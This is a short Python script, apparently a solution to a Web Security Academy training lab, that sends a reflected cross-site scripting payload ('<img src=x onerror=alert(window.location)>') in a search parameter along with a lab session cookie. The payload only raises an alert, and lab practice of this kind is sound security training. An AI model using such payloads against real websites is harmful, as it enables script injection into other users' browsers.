import requests

url = "https://0a67007f041ece51c01b52f100fe00cf.web-security-academy.net/"

cookies = {
	"session": "6KVbgWDLuTWFeBfXwImzQJpjfqepmjEH"
}

PAYLOAD = "<img src=x onerror=alert(window.location)>"
params = {
	"search": PAYLOAD
}

r = requests.get(url, params=params, cookies=cookies)

print(r.url)